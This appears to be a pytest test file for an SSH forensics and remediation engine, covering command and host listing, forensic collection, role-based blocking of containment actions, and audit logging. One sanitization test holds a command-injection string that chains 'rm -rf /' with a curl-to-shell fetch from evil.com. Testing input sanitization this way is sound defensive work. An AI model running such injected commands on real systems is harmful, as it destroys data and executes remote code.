"""
Unit and Integration Tests for SSH Remote Forensics & Remediation Engine.
"""
import pytest
from fastapi.testclient import TestClient
from backend.app import app
from backend.database import SessionLocal
from backend.engine.ssh_engine import SSHEngine
from backend.agent.tools import InvestigationToolRegistry
from backend.models.ssh_audit import SSHAuditRecord
from backend.auth.models import DEMO_SOC_USERS

client = TestClient(app)


def test_ssh_list_commands():
    response = client.get("/api/ssh/commands")
    assert response.status_code == 200
    data = response.json()
    assert "forensics" in data
    assert "remediation" in data
    assert "collect_process_tree" in data["forensics"]
    assert "isolate_host_firewall" in data["remediation"]


def test_ssh_list_hosts():
    response = client.get("/api/ssh/hosts")
    assert response.status_code == 200
    hosts = response.json()
    assert len(hosts) >= 1
    hostnames = [h["hostname"] for h in hosts]
    assert any("WORKSTATION" in h or "DC" in h or "WS-" in h for h in hostnames)


def test_ssh_execute_forensics_admin_success():
    payload = {
        "target_host": "WORKSTATION-01",
        "command_type": "collect_process_tree"
    }
    response = client.post("/api/ssh/execute", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["target_host"] == "WORKSTATION-01"
    assert data["command_type"] == "collect_process_tree"
    assert data["status"] in ["SUCCESS", "SIMULATED"]
    assert "powershell.exe" in data["stdout"] or "init" in data["stdout"]


def test_ssh_execute_network_sockets():
    payload = {
        "target_host": "WORKSTATION-01",
        "command_type": "collect_network_sockets"
    }
    response = client.post("/api/ssh/execute", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert "LISTEN" in data["stdout"] or "ESTAB" in data["stdout"]


def test_ssh_execute_containment_admin_success():
    payload = {
        "target_host": "WORKSTATION-01",
        "command_type": "isolate_host_firewall"
    }
    response = client.post("/api/ssh/execute", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["is_containment"] is True
    assert "isolation" in data["stdout"].lower()


def test_ssh_execute_containment_tier1_analyst_forbidden():
    # Tier 1 analyst should NOT be allowed to execute containment SSH remediation
    headers = {
        "X-User-Email": "tier1.analyst@dealers.corp",
        "X-User-Role": "TIER1_ANALYST"
    }
    payload = {
        "target_host": "WORKSTATION-01",
        "command_type": "isolate_host_firewall"
    }
    response = client.post("/api/ssh/execute", json=payload, headers=headers)
    assert response.status_code == 403
    assert "lacks permission" in response.json()["detail"]


def test_ssh_sanitization_defense():
    sanitized = SSHEngine.sanitize_parameter("malicious_file; rm -rf / ; curl evil.com | sh")
    assert ";" not in sanitized
    assert "|" not in sanitized
    assert " " not in sanitized
    assert sanitized == "malicious_filerm-rf/curlevil.comsh"


def test_ssh_audit_log_endpoint():
    # Query audit trail
    response = client.get("/api/ssh/audit")
    assert response.status_code == 200
    records = response.json()
    assert isinstance(records, list)
    assert len(records) >= 1
    assert "command_type" in records[0]
    assert "target_host" in records[0]


def test_agent_ssh_forensics_tool():
    db = SessionLocal()
    try:
        tools = InvestigationToolRegistry(db)
        result = tools.execute_ssh_forensics("WORKSTATION-01", "collect_auth_logs")
        assert result is not None
        assert result["target_host"] == "WORKSTATION-01"
        assert "Oct" in result["stdout"] or "sshd" in result["stdout"]
    finally:
        db.close()
